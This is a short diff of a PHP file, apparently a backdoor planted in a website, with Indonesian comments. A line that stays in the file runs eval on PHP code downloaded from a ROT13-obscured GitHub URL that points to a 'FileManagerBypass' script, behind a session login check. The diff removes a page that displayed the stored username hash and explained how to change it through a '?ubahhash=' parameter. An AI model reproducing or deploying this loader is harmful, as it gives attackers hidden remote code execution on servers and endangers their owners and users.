@@ -57,17 +57,3 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 // Kode asli Anda (dijalankan hanya jika sudah login)
 @eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/AbboGrpub/j/ersf/urnqf/znva/SVyrZnantreOlcnff/jbbc-nfpvv.cuc")));
 ?>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Change Hash</title>
-</head>
-<body>
-<?php if ($_SESSION['logged_in'] === true): ?>
-    <p>Hash saat ini: <?php echo htmlspecialchars($stored_username_hash); ?></p>
-    <p>Gunakan URL dengan parameter <code>?ubahhash=</code> untuk mengganti hash username.</p>
-    <p>Contoh: <code>?ubahhash=$2y$10$abcdefghijklmnopqrstuvwxyz</code></p>
-<?php endif; ?>
-</body>
-</html>
